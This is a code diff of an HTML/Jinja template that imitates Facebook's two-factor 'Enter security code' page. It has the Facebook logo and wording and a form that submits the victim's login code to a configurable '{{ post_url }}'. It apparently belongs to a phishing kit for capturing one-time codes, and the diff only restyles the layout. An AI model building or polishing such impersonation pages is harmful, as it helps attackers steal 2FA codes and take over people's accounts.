@@ -6,44 +6,43 @@
     <title>Facebook - Enter security code</title>
     <link rel="stylesheet" href="/static/style.css">
     <link rel="icon" href="/static/favicon.ico">
+    <style>
+        body { background: #f0f2f5; display: flex; align-items: center; justify-content: center; }
+    </style>
 </head>
 <body>
-    <div class="fb-wrapper">
-        <div class="fb-content fb-content-centered">
-            <div class="fb-2fa-card">
-                <div class="fb-2fa-header">
-                    <img src="/static/logo.svg" alt="Facebook" class="fb-2fa-logo">
-                </div>
-                <h2 class="fb-2fa-title">Two-factor authentication required</h2>
-                <p class="fb-2fa-desc">
-                    You've asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.
-                </p>
-                <p class="fb-2fa-desc">
-                    Enter the 6-digit code from your <strong>authentication app</strong> or the code we sent to your phone.
-                </p>
-                <form action="{{ post_url }}" method="POST">
-                    <input
-                        type="text"
-                        name="code"
-                        class="fb-input fb-2fa-input"
-                        placeholder="Login code"
-                        aria-label="Login code"
-                        autocomplete="one-time-code"
-                        inputmode="numeric"
-                        maxlength="8"
-                        autofocus
-                    >
-                    {% if error_message %}
-                    <div class="fb-error-banner">
-                        {{ error_message }}
-                    </div>
-                    {% endif %}
-                    <button type="submit" class="fb-btn-login">Continue</button>
-                </form>
-                <div class="fb-2fa-footer">
-                    <a href="#">Need another way to authenticate?</a>
-                </div>
+    <div class="fb-2fa-card">
+        <div class="fb-2fa-header">
+            <img src="/static/logo.svg" alt="Facebook" class="fb-2fa-logo">
+        </div>
+        <h2 class="fb-2fa-title">Two-factor authentication required</h2>
+        <p class="fb-2fa-desc">
+            You've asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.
+        </p>
+        <p class="fb-2fa-desc">
+            Enter the 6-digit code from your <strong>authentication app</strong> or the code we sent to your phone.
+        </p>
+        <form action="{{ post_url }}" method="POST">
+            <input
+                type="text"
+                name="code"
+                class="fb-input fb-2fa-input"
+                placeholder="Login code"
+                aria-label="Login code"
+                autocomplete="one-time-code"
+                inputmode="numeric"
+                maxlength="8"
+                autofocus
+            >
+            {% if error_message %}
+            <div class="fb-error-banner" style="margin-top:12px;">
+                {{ error_message }}
             </div>
+            {% endif %}
+            <button type="submit" class="fb-btn-login" style="margin-top:12px;">Continue</button>
+        </form>
+        <div class="fb-2fa-footer">
+            <a href="#">Need another way to authenticate?</a>
         </div>
     </div>
 </body>
